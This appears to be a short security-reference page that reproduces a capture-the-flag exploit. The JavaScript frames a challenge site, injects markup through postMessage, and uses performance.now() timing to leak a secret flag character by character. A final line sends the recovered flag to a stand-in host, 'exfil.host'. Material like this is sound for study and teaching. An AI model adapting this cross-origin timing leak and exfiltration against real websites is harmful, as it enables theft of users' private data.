# performance.now example

{{#include ../../banners/hacktricks-training.md}}

**Example taken from [https://ctf.zeyu2001.com/2022/nitectf-2022/js-api](https://ctf.zeyu2001.com/2022/nitectf-2022/js-api)**

```javascript
const sleep = (ms) => new Promise((res) => setTimeout(res, ms))

async function check(flag) {
  let w = frame.contentWindow
  w.postMessage(
    { op: "preview", payload: '<img name="enable_experimental_features">' },
    "*"
  )
  await sleep(1)
  w.postMessage({ op: "search", payload: flag }, "*")
  let t1 = performance.now()
  await sleep(1)
  return performance.now() - t1 > 200
}

async function main() {
  let alpha =
    "abcdefghijklmnopqrstuvwxyz0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ-}"
  window.frame = document.createElement("iframe")
  frame.width = "100%"
  frame.height = "700px"
  frame.src = "https://challenge.jsapi.tech/"
  document.body.appendChild(frame)
  await sleep(1000)

  let flag = "nite{"
  while (1) {
    for (let c of alpha) {
      let result = await Promise.race([
        check(flag + c),
        new Promise((res) =>
          setTimeout(() => {
            res(true)
          }, 300)
        ),
      ])
      console.log(flag + c, result)
      if (result) {
        flag += c
        break
      }
    }
    new Image().src = "//exfil.host/log?" + encodeURIComponent(flag)
  }
}

document.addEventListener("DOMContentLoaded", main)
```

{{#include ../../banners/hacktricks-training.md}}



